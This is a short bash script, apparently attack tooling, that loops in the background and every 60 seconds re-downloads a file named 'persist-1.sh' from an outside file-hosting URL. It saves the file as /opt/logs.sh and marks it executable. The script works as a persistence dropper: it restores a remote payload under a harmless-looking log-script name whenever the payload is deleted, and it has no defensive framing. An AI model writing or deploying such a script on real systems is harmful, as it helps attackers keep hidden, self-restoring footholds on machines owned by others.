#!/bin/bash

# Define the file path and the URL
FILE_PATH="/opt/logs.sh"
URL="https://limewire.com/assets/b20393a8-dbd7-4701-833b-7dacaed9f06c/persist-1.sh?download-mitm=true"


while true; 
do
    # Check if the file exists
    if [ -f "$FILE_PATH" ]; then
        echo "File $FILE_PATH exists."
    else
        echo "File $FILE_PATH does not exist. Downloading from $URL..."
        
        # Download the file using curl
        curl -o "$FILE_PATH" "$URL"
        
        # Check if the download was successful
        if [ $? -eq 0 ]; then
            echo "Download successful. File saved to $FILE_PATH."
        else
            echo "Failed to download the file."
            exit 1
        fi
    fi

    # Make the file executable (optional)
    chmod +x "$FILE_PATH"

    echo "Script execution completed."
sleep 60; 
done &